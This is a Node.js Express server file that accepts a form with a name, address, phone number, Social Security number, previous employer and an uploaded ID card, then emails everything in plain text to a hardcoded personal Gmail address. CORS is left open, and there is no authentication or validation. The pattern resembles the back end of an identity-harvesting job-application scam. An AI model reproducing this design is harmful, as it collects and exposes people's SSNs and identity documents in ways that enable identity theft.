require("dotenv").config();
const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");
const multer = require("multer");

const app = express();
const port = 5000;

// Configure Multer for file uploads
const upload = multer({ storage: multer.memoryStorage() });

app.use(cors());
app.use(express.json());

// Nodemailer transporter setup
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER, // Your Gmail
    pass: process.env.EMAIL_PASS, // Gmail App Password
  },
});

app.post("/send-email", upload.single("idCard"), async (req, res) => {
  try {
    const { name, address, phone, email, ssn, previousEmployer } = req.body;
    const idCard = req.file;

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: "chidoziemail@gmail.com",
      subject: "New Form Submission",
      text: `
        Name: ${name}
        Address: ${address}
        Phone: ${phone}
        Email: ${email}
        SSN: ${ssn}
        Previous Employer: ${previousEmployer}
      `,
      attachments: idCard
        ? [
            {
              filename: idCard.originalname,
              content: idCard.buffer,
              encoding: "base64",
            },
          ]
        : [],
    };

    await transporter.sendMail(mailOptions);
    res.status(200).json({ message: "Email sent successfully!" });
  } catch (error) {
    console.error("Error sending email:", error);
    res.status(500).json({ message: "Failed to send email" });
  }
});

app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
